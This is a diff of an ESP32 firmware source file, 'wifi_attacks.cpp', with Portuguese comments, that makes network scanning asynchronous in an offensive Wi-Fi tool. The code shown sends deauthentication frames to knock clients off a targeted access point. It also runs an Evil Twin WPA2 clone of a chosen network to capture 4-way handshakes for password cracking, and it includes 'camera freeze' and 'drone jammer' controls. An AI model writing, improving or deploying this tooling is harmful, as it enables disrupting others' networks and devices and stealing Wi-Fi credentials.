@@ -1,5 +1,5 @@
 // ============================================================
-// wifi_attacks.cpp - v4.1 Handshake Edition
+// wifi_attacks.cpp - v4.2 Async Edition
 // Evil Twin com AP WPA2 + captura de 4-way handshake
 // ============================================================
 #include <WiFi.h>
@@ -153,13 +153,11 @@ static void deauthBurst() {
     uint8_t frame[32];
     const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-    // Deauth unicast para cada cliente
     for (int i = 0; i < clientCount; i++) {
         buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x07);
         raw_tx(frame, 26);
         delay(1);
     }
-    // Broadcast deauth
     buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
     raw_tx(frame, 26);
 }
@@ -174,27 +172,46 @@ static bool isSoftAPActive() {
 }
 
 // ============================================================
-// SCAN WIFI
+// SCAN WIFI - ASSÍNCRONO E NÃO BLOQUEANTE
 // ============================================================
-void scanNetworks() {
-    networkCount = 0;
-    Serial.println("[WiFi] Starting network scan...");
+volatile bool scanInProgress = false;
+volatile bool scanComplete = false;
+volatile int  scanResultCount = 0;
 
-    // CORRECAO: nunca desliga o AP para escanear.
-    // Se estiver em modo AP puro, sobe a interface STA (AP_STA).
-    // Se ja for AP_STA, mantem assim.
+void scanNetworks() {
+    if (scanInProgress) {
+        Serial.println("[WiFi] Scan already running");
+        return;
+    }
+    
+    networkCount = 0;
+    scanInProgress = true;
+    scanComplete = false;
+    
+    Serial.println("[WiFi] Starting ASYNC network scan...");
+    
     wifi_mode_t modeBefore = WiFi.getMode();
     if (modeBefore == WIFI_AP) {
-        Serial.println("[WiFi] Upping STA interface for scan...");
         WiFi.mode(WIFI_AP_STA);
-        delay(100);
+        delay(50);
     }
+    
+    // Scan assíncrono: não trava o WebServer! 200ms por canal.
+    WiFi.scanNetworksAsync([](int n) {
+        scanResultCount = n;
+        scanComplete = true;
+        scanInProgress = false;
+        Serial.printf("[WiFi] Async scan done: %d networks\n", n);
+    }, false, 200);
+}
 
-    // Scan sincrono. Em AP_STA o AP continua ativo
-    // e os clientes (Termux) permanecem conectados.
-    int n = WiFi.scanNetworks(false, true, false, 3000);
-    Serial.printf("[WiFi] Scan found %d networks\n", n);
+bool isScanRunning() { return scanInProgress; }
+bool isScanComplete() { return scanComplete; }
 
+void collectScanResults() {
+    if (!scanComplete) return;
+    
+    int n = scanResultCount;
     if (n > 0) {
         networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
         for (int i = 0; i < networkCount; i++) {
@@ -215,21 +232,8 @@ void scanNetworks() {
     } else {
         Serial.printf("[WiFi] Scan error: %d\n", n);
     }
-
-    // Garante que o AP CrazyCat ainda esta saudavel apos o scan
-    if (WiFi.getMode() == WIFI_STA) {
-        WiFi.mode(WIFI_AP_STA);
-        delay(100);
-    }
-    if (WiFi.softAPIP() == IPAddress(0,0,0,0)) {
-        WiFi.softAPConfig(
-            IPAddress(192, 168, 4, 1),
-            IPAddress(192, 168, 4, 1),
-            IPAddress(255, 255, 255, 0)
-        );
-        WiFi.softAP("CrazyCat", "crazycat123", 6, 0, 4);
-        Serial.println("[WiFi] AP restored after scan");
-    }
+    
+    scanComplete = false;
 }
 
 uint8_t getNetworkCount() { return networkCount; }
@@ -318,8 +322,7 @@ static void restartBssidClone() {
     }
 }
 
-static 
-void restoreCrazyCatAP() {
+static void restoreCrazyCatAP() {
     WiFi.mode(WIFI_AP_STA);
     delay(200);
     WiFi.softAPConfig(
@@ -490,9 +493,6 @@ void startEvilTwin(uint8_t networkIndex) {
     }
     delay(200);
 
-    // Cria AP WPA2 com senha falsa (para forcar handshake)
-    // A senha nao importa — o cliente vai tentar conectar e falhar,
-    // mas o handshake M1/M2 sera capturado
     bool apOk = WiFi.softAP(cloneSSID, "password123", cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
 
@@ -511,7 +511,6 @@ void startEvilTwin(uint8_t networkIndex) {
     cloneStartTime = millis();
     cloneHealthCheckFailures = 0;
 
-    // Inicia captura de handshake
     startHandshakeCapture();
 
     Serial.printf("[EvilTwin] ACTIVE: %s CH%d WPA2 | Handshake capture ON\n", cloneSSID, cloneChannel);
@@ -553,24 +552,18 @@ RemoteDevice* getRemoteDevice(uint8_t index) {
 }
 
 // ============================================================
-// CAMERA FREEZE / DRONE
+// CAMERA FREEZE / DRONE (NÃO BLOQUEANTES)
 // ============================================================
 void startCameraFreeze() {
     cameraFreezeActive = true;
-    while (cameraFreezeActive) {
-        delay(50);
-        yield();
-    }
+    // Removido o while(infinito) que travava o ESP32
 }
 
 void stopCameraFreeze() { cameraFreezeActive = false; }
 
 void startDroneJammer() {
     droneJammerActive = true;
-    while (droneJammerActive) {
-        delay(10);
-        yield();
-    }
+    // Removido o while(infinito) que travava o ESP32
 }
 
 void stopDroneJammer() { droneJammerActive = false; }
